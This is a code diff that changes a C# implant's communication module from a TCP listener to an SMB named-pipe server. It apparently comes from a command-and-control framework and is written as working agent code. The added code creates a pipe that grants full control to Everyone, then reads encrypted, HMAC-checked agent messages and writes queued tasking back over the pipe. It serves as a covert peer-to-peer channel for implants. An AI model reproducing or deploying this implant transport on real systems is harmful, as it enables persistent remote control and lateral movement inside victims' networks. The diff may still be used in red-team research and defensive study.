@@ -1,31 +1,36 @@
 ﻿using System;
-using System.Net;
-using System.Net.Sockets;
+using System.IO.Pipes;
+using System.Security.AccessControl;
+using System.Security.Principal;
 using System.Threading;
 using System.Threading.Tasks;
 
-class TcpCommModule : CommModule
+class SmbCommModule : CommModule
 {
-    TcpListener Listener;
+    readonly string Pipename;
     ManualResetEvent Status = new ManualResetEvent(false);
 
-    public TcpCommModule(string bindAddress, int bindPort)
+    public SmbCommModule(string pipename)
     {
-        Listener = new TcpListener(IPAddress.Parse(bindAddress), bindPort);
+        Pipename = pipename;
     }
 
     public override void Start(CryptoController crypto)
     {
         base.Start(crypto);
 
-        Listener.Start();
+        var ps = new PipeSecurity();
+
+        ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null),
+            PipeAccessRights.FullControl, AccessControlType.Allow));
 
         Task.Factory.StartNew(delegate ()
         {
             while (ModuleStatus == ModuleStatus.Running)
             {
                 Status.Reset();
-                Listener.BeginAcceptTcpClient(new AsyncCallback(AcceptCallback), Listener);
+                var pipe = new NamedPipeServerStream(Pipename, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message, PipeOptions.Asynchronous, 1024, 1024, ps);
+                pipe.BeginWaitForConnection(new AsyncCallback(ConnectCallback), pipe);
                 Status.WaitOne();
 
                 Thread.Sleep(1000);
@@ -33,10 +38,67 @@ class TcpCommModule : CommModule
         });
     }
 
-    public override void Stop()
+    private void ConnectCallback(IAsyncResult ar)
     {
-        base.Stop();
-        Listener.Stop();
+        Status.Set();
+
+        var pipe = ar.AsyncState as NamedPipeServerStream;
+        pipe.EndWaitForConnection(ar);
+
+        var state = new CommStateObject
+        {
+            Worker = pipe
+        };
+
+        pipe.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
+    }
+
+    private void ReadCallback(IAsyncResult ar)
+    {
+        var state = ar.AsyncState as CommStateObject;
+        var pipe = state.Worker as NamedPipeServerStream;
+
+        var bytesRead = 0;
+
+        try
+        {
+            bytesRead = pipe.EndRead(ar);
+        }
+        catch { }
+
+        if (bytesRead > 0)
+        {
+            var data = DataJuggle(bytesRead, pipe, state);
+
+            if (Crypto.VerifyHMAC(data))
+            {
+                var inbound = Crypto.Decrypt<AgentMessage>(data);
+
+                if (inbound != null)
+                {
+                    Inbound.Enqueue(inbound);
+                }
+            }
+        }
+
+        var outbound = new AgentMessage { Metadata = Metadata };
+
+        if (Outbound.Count > 0)
+        {
+            outbound = Outbound.Dequeue();
+        }
+
+        var dataToSend = Crypto.Encrypt(outbound);
+
+        pipe.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), pipe);
+    }
+
+    private void WriteCallback(IAsyncResult ar)
+    {
+        var pipe = ar.AsyncState as NamedPipeServerStream;
+
+        pipe.EndWrite(ar);
+        pipe.Close();
     }
 
     public void QueueStageRequest()
@@ -54,70 +116,7 @@ class TcpCommModule : CommModule
         base.SendData(message);
     }
 
-    private void AcceptCallback(IAsyncResult ar)
-    {
-        Status.Set();
-
-        var listener = ar.AsyncState as TcpListener;
-
-        if (ModuleStatus == ModuleStatus.Running)
-        {
-            var handler = Listener.EndAcceptTcpClient(ar);
-            var stream = handler.GetStream();
-            var state = new CommStateObject { Worker = stream };
-            stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
-        }
-    }
-
-    private void ReadCallback(IAsyncResult ar)
-    {
-        var state = ar.AsyncState as CommStateObject;
-        var stream = state.Worker as NetworkStream;
-
-        var bytesRead = 0;
-
-        try
-        {
-            bytesRead = stream.EndRead(ar);
-        }
-        catch { }
-
-        if (bytesRead > 0)
-        {
-            var data = DataJuggle(bytesRead, stream, state);
-
-            if (Crypto.VerifyHMAC(data))
-            {
-                var inbound = Crypto.Decrypt<AgentMessage>(data);
-
-                if (inbound != null)
-                {
-                    Inbound.Enqueue(inbound);
-                }
-            }
-        }
-
-        var outbound = new AgentMessage { Metadata = Metadata };
-        
-        if (Outbound.Count > 0)
-        {
-            outbound = Outbound.Dequeue();
-        }
-
-        var dataToSend = Crypto.Encrypt(outbound);
-
-        stream.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), stream);
-    }
-
-    private void WriteCallback(IAsyncResult ar)
-    {
-        var stream = ar.AsyncState as NetworkStream;
-
-        stream.EndWrite(ar);
-        stream.Close();
-    }
-
-    private byte[] DataJuggle(int bytesRead, NetworkStream stream, CommStateObject state)
+    private byte[] DataJuggle(int bytesRead, NamedPipeServerStream stream, CommStateObject state)
     {
         var final = new byte[] { };
 
